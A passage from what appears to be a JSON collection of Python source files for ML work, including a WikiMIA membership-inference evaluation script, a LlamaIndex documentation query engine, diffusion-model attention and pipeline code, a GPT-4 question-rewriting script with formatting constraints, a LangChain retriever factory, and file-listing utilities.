str,\n        history: Optional[List[Tuple[str, str]]] = None,\n        system: Optional[str] = None,\n        **input_kwargs\n    ) -> Generator[str, None, None]:\n      ",
    "import os, argparse\nfrom collections import defaultdict\nimport numpy as np\nimport pandas as pd\nfrom sklearn.metrics import roc_curve, auc\nfrom tqdm import tqdm\nimport zlib\n\nimport torch\nimport torch.nn.functional as F\n\nfrom transformers import AutoTokenizer, AutoModelForCausalLM\nfrom datasets import load_dataset\n\n\n# helper functions\ndef convert_huggingface_data_to_list_dic(dataset):\n    all_data = []\n    for i in range(len(dataset)):\n        ex = dataset[i]\n        all_data.append(ex)\n    return all_data\n\n# arguments\nparser = argparse.ArgumentParser()\nparser.add_argument('--model', type=str, default='EleutherAI/pythia-2.8b')\nparser.add_argument(\n    '--dataset', type=str, default='WikiMIA_length32', \n    choices=[\n        'WikiMIA_length32', 'WikiMIA_length64', 'WikiMIA_length128', \n        'WikiMIA_length32_paraphrased',\n        'WikiMIA_length64_paraphrased',\n        'WikiMIA_length128_paraphrased', \n    ]\n)\nparser.add_argument('--half', action='store_true')\nparser.add_argument('--int8', action='store_true')\nargs = parser.parse_args()\n\n# load model\ndef load_model(name):\n    int8_kwargs = {}\n    half_kwargs = {}\n    # ref model is small and will be loaded in full precision\n    if args.int8:\n        int8_kwargs = dict(load_in_8bit=True, torch_dtype=torch.bfloat16)\n    elif args.half:\n        half_kwargs = dict(torch_dtype=torch.bfloat16)\n    \n    if 'mamba' in name:\n        try:\n            from transformers import MambaForCausalLM\n        except ImportError:\n            raise ImportError\n        model = MambaForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )        \n    else:\n        model = AutoModelForCausalLM.from_pretrained(\n            name, return_dict=True, device_map='auto', **int8_kwargs, **half_kwargs\n        )\n    model.eval()\n    tokenizer = AutoTokenizer.from_pretrained(name)\n    return model, tokenizer\n\nmodel, tokenizer = load_model(args.model)\n\n# load dataset\nif not 'paraphrased' in args.dataset:\n    dataset = load_dataset('swj0419/WikiMIA', split=args.dataset)\nelse:\n    dataset = load_dataset('zjysteven/WikiMIA_paraphrased_perturbed', split=args.dataset)\ndata = convert_huggingface_data_to_list_dic(dataset)\n\nperturbed_dataset = load_dataset(\n    'zjysteven/WikiMIA_paraphrased_perturbed', \n    split=args.dataset + '_perturbed'\n)\nperturbed_data = convert_huggingface_data_to_list_dic(perturbed_dataset)\nnum_neighbors = len(perturbed_data) // len(data)\n\n# inference - get scores for each input\ndef inference(text, model):\n    input_ids = torch.tensor(tokenizer.encode(text)).unsqueeze(0)\n    input_ids = input_ids.to(model.device)\n    with torch.no_grad():\n        outputs = model(input_ids, labels=input_ids)\n    loss, logits = outputs[:2]\n    ll = -loss.item() # log-likelihood\n    return ll\n\nscores = defaultdict(list)\nfor i, d in enumerate(tqdm(data, total=len(data), desc='Samples')): \n    text = d['input']\n    ll = inference(text, model)\n\n    ll_neighbors = []\n    for j in range(num_neighbors):\n        text = perturbed_data[i * num_neighbors + j]['input']\n        ll_neighbors.append(inference(text, model))\n\n    # assuming the score is larger for training data\n    # and smaller for non-training data\n    # this is why sometimes there is a negative sign in front of the score\n    scores['neighbor'].append(ll - np.mean(ll_neighbors))\n\n# compute metrics\n# tpr and fpr thresholds are hard-coded\ndef get_metrics(scores, labels):\n    fpr_list, tpr_list, thresholds = roc_curve(labels, scores)\n    auroc = auc(fpr_list, tpr_list)\n    fpr95 = fpr_list[np.where(tpr_list >= 0.95)[0][0]]\n    tpr05 = tpr_list[np.where(fpr_list <= 0.05)[0][-1]]\n    return auroc, fpr95, tpr05\n\nlabels = [d['label'] for d in data] # 1: training, 0: non-training\nresults = defaultdict(list)\nfor method, scores in scores.items():\n    auroc, fpr95, tpr05 = get_metrics(scores, labels)\n    \n    results['method'].append(method)\n    results['auroc'].append(f\"{auroc:.1%}\")\n    results['fpr95'].append(f\"{fpr95:.1%}\")\n    results['tpr05'].append(f\"{tpr05:.1%}\")\n\ndf = pd.DataFrame(results)\nprint(df)\n\nsave_root = f\"results/{args.dataset}\"\nif not os.path.exists(save_root):\n    os.makedirs(save_root)\n\nmodel_id = args.model.split('/')[-1]\nif os.path.isfile(os.path.join(save_root, f\"{model_id}.csv\")):\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False, mode='a', header=False)\nelse:\n    df.to_csv(os.path.join(save_root, f\"{model_id}.csv\"), index=False)",
    "import json\nimport traceback\nfrom typing import Any, Dict, Tuple\nfrom collections import Counter\nfrom dataclasses import dataclass\nfrom llama_index.core.base.response.schema import PydanticResponse\nfrom llama_index.core.prompts import PromptTemplate\nfrom llama_index.core import Settings, VectorStoreIndex\nfrom llama_index.core.retrievers import QueryFusionRetriever\nfrom llama_index.core.query_engine import RetrieverQueryEngine\nfrom llama_index.core.llms.llm import LLM\nfrom llama_index.program.openai import OpenAIPydanticProgram\nfrom . import ROOT\nfrom .templates import (\n    PROMPT_EVAL,\n    PROMPT_RETRY,\n    PROMPT_DOCUMENTATION,\n    PROMPT_INPUT_PARAMETER,\n    PROMPT_OUTPUT_PARAMETER,\n    PROMPT_PYTHON_DTYPE,\n    PROMPT_INFRA_TYPE,\n    TEXT_QA_PROMPTS,\n    eval_questions,\n    create_eval_schema,\n    Node,\n)\nfrom .utils import update_node_info, format_response, id_to_node, node_to_id\n\n\n@dataclass\nclass EvaluatedResponse:\n    response: PydanticResponse | None = None\n    score: int = -1\n    feedback: str | None = None\n    passing: bool = False\n\n\nclass NodeQueryEngine:\n    \"\"\"\n    Implements advanced querying for node documentation.\n    Process includes retrieveing context from code database, querying llm with structured output guidance,\n    self correcting via evaluation, refining query with evaluation output, obtaining node usage info from pipelines database,\n    postprocessing and formatting output into the desired format.\n    Querying works iteratively until num_retries is reached or response is satisfactory.\n    \"\"\"\n\n    def __init__(self, indexes: VectorStoreIndex, num_retries: int, top_k: int) -> None:\n        retrievers = [index.as_retriever(similarity_top_k=top_k) for index in indexes]\n        retriever = QueryFusionRetriever(retrievers=retrievers, similarity_top_k=top_k, num_queries=1)\n        self.engine = RetrieverQueryEngine.from_args(retriever, text_qa_template=TEXT_QA_PROMPTS)\n        self.max_score = len(eval_questions) * 5\n        self.evaluator = StructuredEvaluator(eval_template=PROMPT_EVAL, score_threshold=self.max_score)\n        self.num_retries = num_retries\n\n    def query(self, node_name: str, node_info: Dict[str, Any]) -> Dict[str, Any]:\n        node_info = update_node_info(node_info)\n        inputs_str = str([k for d in node_info[\"input_parameters\"].values() for k in d.keys()])\n        outputs_str = str(list(node_info[\"output_parameters\"].keys()))\n        Evaluation = create_eval_schema(\n            prompt_documentation=PROMPT_DOCUMENTATION,\n            prompt_input_parameter=PROMPT_INPUT_PARAMETER,\n            prompt_output_parameter=PROMPT_OUTPUT_PARAMETER,\n            prompt_python_dtype=PROMPT_PYTHON_DTYPE,\n            prompt_infra_type=PROMPT_INFRA_TYPE,\n            node_name=node_name,\n            input_parameters=inputs_str,\n            output_parameters=outputs_str,\n        )\n        Node.format_field_description(\"input_types\", input_parameters=inputs_str)\n        Node.format_field_description(\"output_types\", output_parameters=outputs_str)\n        self.engine._response_synthesizer._output_cls = Node\n        self.evaluator.llm_program._output_cls = Evaluation\n        query = f\"Analyze node {node_name}.\"\n        error = None\n        best_response = EvaluatedResponse()\n        for _ in range(self.num_retries):\n            try:\n                response = self.engine.query(query)\n                evaluated_response = self.evaluator.evaluate_response(response)\n            except Exception:\n                error = traceback.format_exc()\n                continue\n            error = None\n            if evaluated_response.score > best_response.score:\n                best_response = evaluated_response\n            if evaluated_response.passing:\n                response = format_response(\n                    node_name, response, node_info, f\"{evaluated_response.score}/{self.max_score}\"\n                )\n                response = self.generate_usage_information(response)\n                self.reset()\n                return response\n            query = PROMPT_RETRY.format(response=best_response.response, feedback=best_response.feedback)\n        if error is not None and best_response.response is None:\n            self.reset()\n            return {\"_debug_info\": {\"_eval_score\": f\"0/{self.max_score}\", \"_has_unknown\": True, \"_error\": error}}\n        response = format_response(\n            node_name, best_response.response, node_info, f\"{int(best_response.score)}/{self.max_score}\"\n        )\n        response = self.generate_usage_information(response)\n        self.reset()\n        return response\n\n    def generate_usage_information(self, response: Dict[str, Any], most_common: int = 10, max_pipelines: int = 10):\n        common_nodes = []\n        with open(ROOT / \"data\" / \"pipelines_db.json\", \"r\") as file:\n            json_data = json.load(file)\n        for json_value in json_data:\n            # Look for nodes that are frequently used with this node\n            current_pipeline = json.loads(json_value[\"",
    "# Adapted from https://github.com/magic-research/magic-animate/blob/main/magicanimate/models/mutual_self_attention.py\nfrom typing import Any, Dict, Optional\n\nimport torch\nfrom einops import rearrange\n\nfrom .attention import TemporalBasicTransformerBlock\n\nfrom .attention import BasicTransformerBlock\n\n\ndef torch_dfs(model: torch.nn.Module):\n    result = [model]\n    for child in model.children():\n        result += torch_dfs(child)\n    return result\n\n\nclass ReferenceAttentionControl:\n    def __init__(\n        self,\n        unet,\n        mode=\"write\",\n        do_classifier_free_guidance=False,\n        attention_auto_machine_weight=float(\"inf\"),\n        gn_auto_machine_weight=1.0,\n        style_fidelity=1.0,\n        reference_attn=True,\n        reference_adain=False,\n        fusion_blocks=\"midup\",\n        batch_size=1,\n    ) -> None:\n        # 10. Modify self attention and group norm\n        self.unet = unet\n        assert mode in [\"read\", \"write\"]\n        assert fusion_blocks in [\"midup\", \"full\"]\n        self.reference_attn = reference_attn\n        self.reference_adain = reference_adain\n        self.fusion_blocks = fusion_blocks\n        self.register_reference_hooks(\n            mode,\n            do_classifier_free_guidance,\n            attention_auto_machine_weight,\n            gn_auto_machine_weight,\n            style_fidelity,\n            reference_attn,\n            reference_adain,\n            fusion_blocks,\n            batch_size=batch_size,\n        )\n\n    def register_reference_hooks(\n        self,\n        mode,\n        do_classifier_free_guidance,\n        attention_auto_machine_weight,\n        gn_auto_machine_weight,\n        style_fidelity,\n        reference_attn,\n        reference_adain,\n        dtype=torch.float16,\n        batch_size=1,\n        num_images_per_prompt=1,\n        device=torch.device(\"cpu\"),\n        fusion_blocks=\"midup\",\n    ):\n        MODE = mode\n        do_classifier_free_guidance = do_classifier_free_guidance\n        attention_auto_machine_weight = attention_auto_machine_weight\n        gn_auto_machine_weight = gn_auto_machine_weight\n        style_fidelity = style_fidelity\n        reference_attn = reference_attn\n        reference_adain = reference_adain\n        fusion_blocks = fusion_blocks\n        num_images_per_prompt = num_images_per_prompt\n        dtype = dtype\n        if do_classifier_free_guidance:\n            uc_mask = (\n                torch.Tensor(\n                    [1] * batch_size * num_images_per_prompt * 16\n                    + [0] * batch_size * num_images_per_prompt * 16\n                )\n                .to(device)\n                .bool()\n            )\n        else:\n            uc_mask = (\n                torch.Tensor([0] * batch_size * num_images_per_prompt * 2)\n                .to(device)\n                .bool()\n            )\n\n        def hacked_basic_transformer_inner_forward(\n            self,\n            hidden_states: torch.FloatTensor,\n            attention_mask: Optional[torch.FloatTensor] = None,\n            encoder_hidden_states: Optional[torch.FloatTensor] = None,\n            encoder_attention_mask: Optional[torch.FloatTensor] = None,\n            timestep: Optional[torch.LongTensor] = None,\n            cross_attention_kwargs: Dict[str, Any] = None,\n            class_labels: Optional[torch.LongTensor] = None,\n            video_length=None,\n        ):\n            if self.use_ada_layer_norm:  # False\n                norm_hidden_states = self.norm1(hidden_states, timestep)\n            elif self.use_ada_layer_norm_zero:\n                (\n                    norm_hidden_states,\n                    gate_msa,\n                    shift_mlp,\n                    scale_mlp,\n                    gate_mlp,\n                ) = self.norm1(\n                    hidden_states,\n                    timestep,\n                    class_labels,\n                    hidden_dtype=hidden_states.dtype,\n                )\n            else:\n                norm_hidden_states = self.norm1(hidden_states)\n\n            # 1. Self-Attention\n            # self.only_cross_attention = False\n            cross_attention_kwargs = (\n                cross_attention_kwargs if cross_attention_kwargs is not None else {}\n            )\n            if self.only_cross_attention:\n                attn_output = self.attn1(\n                    norm_hidden_states,\n                    encoder_hidden_states=encoder_hidden_states\n                    if self.only_cross_attention\n                    else None,\n                    attention_mask=attention_mask,\n                    **cross_attention_kwargs,\n                )\n            else:\n                if MODE == \"write\":\n                    self.bank.append(norm_hidden_states.clone())\n                    attn_output = self.attn1(\n                        norm_hidden_states,\n                        encoder_hidden_states=encoder_hidden_states\n                        if self.only_cross_attention\n                        else None,\n                        attention_mask=a",
    "# Copyright 2023 Stanford University Team and The HuggingFace Team. All rights reserved.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n# DISCLAIMER: This code is strongly influenced by https://github.com/pesser/pytorch_diffusion\n# and https://github.com/hojonathanho/diffusion\n\nimport inspect\nfrom typing import Any, Callable, Dict, List, Optional, Union\n\nimport torch\nfrom transformers import CLIPImageProcessor, CLIPTextModel, CLIPTokenizer\n\nfrom ...image_processor import VaeImageProcessor\nfrom ...loaders import FromSingleFileMixin, LoraLoaderMixin, TextualInversionLoaderMixin\nfrom ...models import AutoencoderKL, UNet2DConditionModel\nfrom ...models.lora import adjust_lora_scale_text_encoder\nfrom ...schedulers import LCMScheduler\nfrom ...utils import (\n    USE_PEFT_BACKEND,\n    deprecate,\n    logging,\n    replace_example_docstring,\n    scale_lora_layers,\n    unscale_lora_layers,\n)\nfrom ...utils.torch_utils import randn_tensor\nfrom ..pipeline_utils import DiffusionPipeline\nfrom ..stable_diffusion import StableDiffusionPipelineOutput, StableDiffusionSafetyChecker\n\n\nlogger = logging.get_logger(__name__)  # pylint: disable=invalid-name\n\nEXAMPLE_DOC_STRING = \"\"\"\n    Examples:\n        ```py\n        >>> from diffusers import DiffusionPipeline\n        >>> import torch\n\n        >>> pipe = DiffusionPipeline.from_pretrained(\"SimianLuo/LCM_Dreamshaper_v7\")\n        >>> # To save GPU memory, torch.float16 can be used, but it may compromise image quality.\n        >>> pipe.to(torch_device=\"cuda\", torch_dtype=torch.float32)\n\n        >>> prompt = \"Self-portrait oil painting, a beautiful cyborg with golden hair, 8k\"\n\n        >>> # Can be set to 1~50 steps. LCM support fast inference even <= 4 steps. Recommend: 1~8 steps.\n        >>> num_inference_steps = 4\n        >>> images = pipe(prompt=prompt, num_inference_steps=num_inference_steps, guidance_scale=8.0).images\n        >>> images[0].save(\"image.png\")\n        ```\n\"\"\"\n\n\nclass LatentConsistencyModelPipeline(\n    DiffusionPipeline, TextualInversionLoaderMixin, LoraLoaderMixin, FromSingleFileMixin\n):\n    r\"\"\"\n    Pipeline for text-to-image generation using a latent consistency model.\n\n    This model inherits from [`DiffusionPipeline`]. Check the superclass documentation for the generic methods\n    implemented for all pipelines (downloading, saving, running on a particular device, etc.).\n\n    The pipeline also inherits the following loading methods:\n        - [`~loaders.TextualInversionLoaderMixin.load_textual_inversion`] for loading textual inversion embeddings\n        - [`~loaders.LoraLoaderMixin.load_lora_weights`] for loading LoRA weights\n        - [`~loaders.LoraLoaderMixin.save_lora_weights`] for saving LoRA weights\n        - [`~loaders.FromSingleFileMixin.from_single_file`] for loading `.ckpt` files\n\n    Args:\n        vae ([`AutoencoderKL`]):\n            Variational Auto-Encoder (VAE) model to encode and decode images to and from latent representations.\n        text_encoder ([`~transformers.CLIPTextModel`]):\n            Frozen text-encoder ([clip-vit-large-patch14](https://huggingface.co/openai/clip-vit-large-patch14)).\n        tokenizer ([`~transformers.CLIPTokenizer`]):\n            A `CLIPTokenizer` to tokenize text.\n        unet ([`UNet2DConditionModel`]):\n            A `UNet2DConditionModel` to denoise the encoded image latents.\n        scheduler ([`SchedulerMixin`]):\n            A scheduler to be used in combination with `unet` to denoise the encoded image latents. Currently only\n            supports [`LCMScheduler`].\n        safety_checker ([`StableDiffusionSafetyChecker`]):\n            Classification module that estimates whether generated images could be considered offensive or harmful.\n            Please refer to the [model card](https://huggingface.co/runwayml/stable-diffusion-v1-5) for more details\n            about a model's potential harms.\n        feature_extractor ([`~transformers.CLIPImageProcessor`]):\n            A `CLIPImageProcessor` to extract features from generated images; used as inputs to the `safety_checker`.\n        requires_safety_checker (`bool`, *optional*, defaults to `True`):\n            Whether the pipeline requires a safety checker component.\n    \"\"\"\n\n    model_cpu_offload_seq = \"text_encoder->unet->vae\"\n    _optional_components = [\"safety_checker\", \"feature_extractor\"]\n    _exclude_from_cpu_offload = [\"safety_checker\"]\n    _callback_tensor_inputs = [\"latents\", \"denoised\", \"prompt_embeds\", \"w_embedding\"]\n\n    def __init__(\n        self,\n        vae: Au",
    "import json\nimport os\nfrom tqdm import tqdm\nfrom concurrent.futures import ThreadPoolExecutor\nimport argparse\nfrom utils import get_prompt\nfrom openai import OpenAI\n\nMAX_API_RETRY = 5\nAPI_KEY = os.environ[\"OPENAI_API_KEY\"]\n\ndef get_response(query, level, constrainted_question, prompt):\n    for _ in range(MAX_API_RETRY):\n        try:\n            client = OpenAI(api_key=API_KEY)\n            response = client.chat.completions.create(\n                model='gpt-4-turbo-preview',\n                max_tokens=1024,\n                top_p=0.3,\n                temperature=0.4,\n                messages=[{\n                    'role': 'user',\n                    'content': prompt,\n                }],\n            )\n            content = response.choices[0].message.content\n        except Exception as e:\n            print(f\"failed...{e}\")\n            continue\n        try:\n            if content.startswith(\"```json\"): # remove markdown, used for gpt-4 turbo\n                content = content[7:-3]\n            answer = json.loads(content)['rewritten question']\n        except Exception as e:\n            print(f\"json failed to parse: {e}\")\n            print(f\"content: {content}\")\n            return None\n        return query, level, {'constrainted_original_questions': {level: constrainted_question}, 'constrainted_questions': {level: answer}}\n\ndef main(args):\n    # load input queries\n    input_file = os.path.join(args.dir, \"04_constrainted_question.json\")\n    output_file = os.path.join(args.dir, \"04_constrainted_question_format_number.json\")\n\n    constrainted_question = json.load(open(input_file, \"r\"))\n    constrainted_question_fn = {}\n\n    # randomly select 1000 samples from constrainted questions\n    seed_list = []\n    for q, item in constrainted_question.items():\n        for level, rq in item['constrainted_questions'].items():\n            seed_list.append((q, level, rq))\n    import random\n    random.seed(42)\n    random.shuffle(seed_list)\n    seed_list = seed_list[:1000]\n\n    # load prompt\n    prompt = get_prompt(\"fn recombination\")\n\n    # load constraints list\n    format_constraint_list = [\n        \"To create a blockquote, begin a paragraph with >> followed by a space.\\n\",\n        \"For strikethrough text, wrap the text with ~~ on each side.\\n\",\n        \"Indicate a block of code by wrapping the text with backticks ` on each side for inline code or triple backticks ``` for a code block.\\n\",\n        \"Enclose a spoiler or hidden text with || on each side to allow readers to choose whether to view it.\\n\",\n        \"For a highlighted annotation, use %% around the text.\\n\",\n        \"To create a drop cap at the beginning of a paragraph, use << followed by the letter and >>.\\n\",\n        \"Use <<< and >>> on separate lines above and below a paragraph to center it.\\n\",\n        \"Indicate an action by prefacing the sentence with an asterisk *.\\n\",\n        \"To create a separator or thematic break, use a line of asterisks ****** on a separate line.\\n\",\n        \"For a title or heading, start the line with three or more equals signs === at both the beginning and the end of the line.\\n\",\n        \"Surround text that should be in a different font with <<>> at the beginning and <<<\\font name>>> at the end.\\n\",\n        \"Start each list item with > followed by a space.\\n\",\n        \"Enclose the word or phrase to be emphasized with ** on each side.\\n\",\n        \"Highlight the significant word or phrase by wrapping it with __ on each side for underlining.\\n\",\n        \"Mark the focus word or phrase with // on either side to indicate italics.\\n\",\n        \"Frame actions or sound effects with brackets [ ] on each side.\\n\",\n        \"Surround actions or sound effects with parentheses ( ) on each side.\\n\",\n        \"Start a sentence with ##.\\n\",\n        \"Use -- before and after reponse.\\n\",\n        \"Surround a list header with double underscores __ __ for strong emphasis.\\n\",\n        \"Use ** ** around a list header to indicate bold text formatting.\\n\"\n    ]\n    numerical_constraint_list = [\n        \"Answer with [5, 10, 15] sentences, using ##Sen as the beginning of each sentence.\\n\",\n        \"Answer with [1, 3, 5] paragraphs.\\n\",\n        \"Answer within [100, 150, 200, 250, 300] words.\\n\",\n        \"Answer with at leat [100, 150, 200, 300] words.\\n\",\n        \"Limit each answer to no more than [10, 20, 30] characters per word.\\n\",\n        \"Provide an answer consisting of exactly [2, 3, 4] sentences per paragraph, with a minimum of [1, 2] paragraphs.\\n\",\n        \"Begin each answer with a rhetorical question, followed by [2, 3, 4] explanatory sentences.\\n\",\n        \"Answer using only simple sentences, with each sentence containing [5, 7, 10] words.\\n\",\n        \"Construct the answer as a dialogue between two characters with [4, 6, 8] exchanges (back and forth).\\n\",\n        \"Answer with an introductory sentence, a [3, 4, 5]-item list, and a concluding sentence.\\n\",\n        \"Provide an answer where the first word of each sentence starts with sequential letters of the alph",
    "from abc import ABC, abstractmethod\nfrom typing import List, Dict, Any\nfrom langchain_core.runnables import ConfigurableField\nfrom langchain_openai import ChatOpenAI\nfrom langchain.chains.query_constructor.base import AttributeInfo\nfrom langchain.retrievers.self_query.base import SelfQueryRetriever\n\nfrom langchain.retrievers import EnsembleRetriever\nfrom langchain_core.retrievers import BaseRetriever\n\n\nclass RetrieverFactory(ABC):\n    \"\"\"\n    \uae30\ubcf8 \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4. \ubaa8\ub4e0 \uac80\uc0c9\uae30 \ud329\ud1a0\ub9ac\ub294 \uc774 \ud074\ub798\uc2a4\ub97c \uc0c1\uc18d\ubc1b\uc544\uc57c \ud569\ub2c8\ub2e4.\n    \"\"\"\n\n    def __init__(self, db: Any):\n        \"\"\"\n        \uac80\uc0c9\uae30 \ud329\ud1a0\ub9ac\ub97c \ucd08\uae30\ud654\ud569\ub2c8\ub2e4.\n\n        :param db: \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc778\uc2a4\ud134\uc2a4\n        \"\"\"\n        self.db = db\n\n    @abstractmethod\n    def create(self, **kwargs) -> BaseRetriever:\n        \"\"\"\n        \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\ub97c \uc0dd\uc131\ud558\uace0 \ubc18\ud658\ud569\ub2c8\ub2e4. \ud30c\uc0dd \ud074\ub798\uc2a4\ub294 \uc774 \uba54\uc11c\ub4dc\ub97c \uad6c\ud604\ud574\uc57c \ud569\ub2c8\ub2e4.\n\n        :param kwargs: \uac80\uc0c9\uae30 \uc0dd\uc131\uc5d0 \ud544\uc694\ud55c \ucd94\uac00 \ub9e4\uac1c\ubcc0\uc218\n        :return: \uc0dd\uc131\ub41c \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\n        \"\"\"\n        pass\n\n    def _configure_fields(\n        self,\n        retriever: BaseRetriever,\n        configurable_fields: Dict[str, ConfigurableField],\n    ) -> BaseRetriever:\n        \"\"\"\n        \uac80\uc0c9\uae30\uc5d0 \ub300\ud55c \uad6c\uc131 \uac00\ub2a5\ud55c \ud544\ub4dc\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n\n        :param retriever: \uad6c\uc131\ud560 \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\n        :param configurable_fields: \uad6c\uc131 \uac00\ub2a5\ud55c \ud544\ub4dc \ub515\uc154\ub108\ub9ac\n        :return: \uad6c\uc131\ub41c \uac80\uc0c9\uae30 \uc778\uc2a4\ud134\uc2a4\n        \"\"\"\n        for field_name, field_value in configurable_fields.items():\n            setattr(retriever, field_name, field_value)\n        return retriever\n\n\nclass FAISSRetrieverFactory(RetrieverFactory):\n    \"\"\"\n    FAISS \uae30\ubc18 \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4.\n    \"\"\"\n\n    def create(self, **kwargs) -> BaseRetriever:\n        search_kwargs = kwargs.get(\"search_kwargs\", {\"k\": 30})\n        faiss_retriever = self.db.as_retriever(  # \uac80\uc0c9 \uc2dc \ubc18\ud658\ud560 \uacb0\uacfc\uc758 \uac1c\uc218\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n            search_kwargs=search_kwargs\n        ).configurable_fields(\n            search_kwargs=ConfigurableField(\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uace0\uc720 \uc2dd\ubcc4\uc790\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n                id=\"search_kwargs_faiss\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uc774\ub984\uc744 \uc124\uc815\ud569\ub2c8\ub2e4.\n                name=\"Search Kwargs\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc5d0 \ub300\ud55c \uc124\uba85\uc744 \uc791\uc131\ud569\ub2c8\ub2e4.\n                description=\"The search kwargs to use\",\n            )\n        )\n        return faiss_retriever\n\n\nclass SelfQueryRetrieverFactory(RetrieverFactory):\n    \"\"\"\n    SelfQuery \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4.\n    \"\"\"\n\n    def create(self, **kwargs) -> BaseRetriever:\n        llm_for_selfquery = ChatOpenAI(\n            model=kwargs.get(\"model\", \"gpt-4-turbo-preview\"),\n            temperature=kwargs.get(\"temperature\", 0),\n            api_key=kwargs.get(\"api_key\", \"\"),\n        )\n        document_content_description = kwargs.get(\n            \"document_content_description\",\n            \"Information about each chat message in a KakaoTalk chat log.\",\n        )\n        metadata_field_info = kwargs.get(\n            \"metadata_field_info\",\n            [\n                AttributeInfo(\n                    name=\"year\",\n                    description=\"The year of the chat message was sent\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"month\",\n                    description=\"The month of the chat message was sent\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"day\",\n                    description=\"The day of the chat message was sent\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"user\",\n                    description=\"The user who sent the message\",\n                    type=\"string\",\n                ),\n                AttributeInfo(\n                    name=\"row\",\n                    description=\"The row number in the original CSV file\",\n                    type=\"integer\",\n                ),\n                AttributeInfo(\n                    name=\"source\", description=\"File path of the source\", type=\"string\"\n                ),\n            ],\n        )\n\n        search_kwargs = kwargs.get(\"search_kwargs\", {\"k\": 30})\n        self_query_retriever = SelfQueryRetriever.from_llm(\n            llm_for_selfquery,\n            self.db,\n            document_content_description,\n            metadata_field_info,\n            search_kwargs=search_kwargs,\n        ).configurable_fields(\n            search_kwargs=ConfigurableField(\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uace0\uc720 \uc2dd\ubcc4\uc790\ub97c \uc124\uc815\ud569\ub2c8\ub2e4.\n                id=\"search_kwargs_selfquery\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc758 \uc774\ub984\uc744 \uc124\uc815\ud569\ub2c8\ub2e4.\n                name=\"Search Kwargs\",\n                # \uac80\uc0c9 \ub9e4\uac1c\ubcc0\uc218\uc5d0 \ub300\ud55c \uc124\uba85\uc744 \uc791\uc131\ud569\ub2c8\ub2e4.\n                description=\"The search kwargs to use\",\n            )\n        )\n        return self_query_retriever\n\n\nclass EnsembleRetrieverFactory(RetrieverFactory):\n    \"\"\"\n    \uc559\uc0c1\ube14 \uac80\uc0c9\uae30 \uc0dd\uc131\uc790 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4.\n    \"\"\"\n\n    def create(\n        self,\n        retrievers: List[BaseRetriever],\n        weights: List[float],\n        search_type: str = \"mmr\",\n        **kwargs\n    ) -> BaseRetriever:\n        if not retrievers or not weights or len(retrievers) != len(weights):\n            raise ValueError(\n                \"Retrievers and weights must be non-empty lists of equal length.\"\n            )\n\n        ensemble",
    "import os\nimport re\nimport shutil\nfrom pathlib import Path\nfrom typing import Union\n\nfrom loguru import logger\n\n\nAUDIO = \"aac|alac|flac|m4a|m4b|m4p|mp3|ogg|opus|wav|wma\"\nVIDEO = \"avi|flv|m4v|mkv|mov|mp4|mpeg|mpg|wmv\"\n\n\ndef list_files(\n    path: Union[Path, str],\n    extensions: str = \"|\".join([AUDIO, VIDEO]),\n    recursive: bool = False,\n    sort: bool = True,\n) -> list[Path]:\n    \"\"\"List files in a directory.\n    Args:\n        path (Path): Path to the directory.\n        extensions (str, optional): Extensions to filter.\n        recursive (bool, optional): Whether to search recursively. Defaults to False.\n        sort (bool, optional): Whether to sort the files. Defaults to True.\n    Returns:\n        list: List of files.\n    \"\"\"\n\n    path = Path(path)\n    if not path.exists():\n        raise FileNotFoundError(f\"Directory {path} does not exist.\")\n\n    files = (\n        [\n            Path(os.path.join(root, filename))\n            for root, _, filenames in os.walk(path, followlinks=True)\n            for filename in filenames\n            if Path(os.path.join(root, filename)).is_file()\n        ]\n        if recursive\n        else [f for f in path.glob(\"*\") if f.is_file()]\n    )\n    # skip hidden files\n    files = [f for f in files if not f.name.startswith(\".\")]\n    if extensions:\n        ext_regex = rf\"\\.({extensions})$\"\n        files = [f for f in files if re.search(ext_regex, str(f), re.IGNORECASE)]\n    if sort:\n        files = sorted(files)\n    return files\n\n\ndef make_dirs(path: Union[Path, str], clean: bool = False):\n    \"\"\"Make directories.\n    Args:\n        path (Union[Path, str]): Path to the directory.\n        clean (bool, optional): Whether to clean the directory. Defaults to False.\n    \"\"\"\n    if isinstance(path, str):\n        path = Path(path)\n    if path.exists():\n        if clean:\n            logger.info(f\"Cleaning output directory: {path}\")\n            shutil.rmtree(path)\n        else:\n            logger.info(f\"Output directory already exists: {path}\")\n    path.mkdir(parents=True, exist_ok=True)\n",
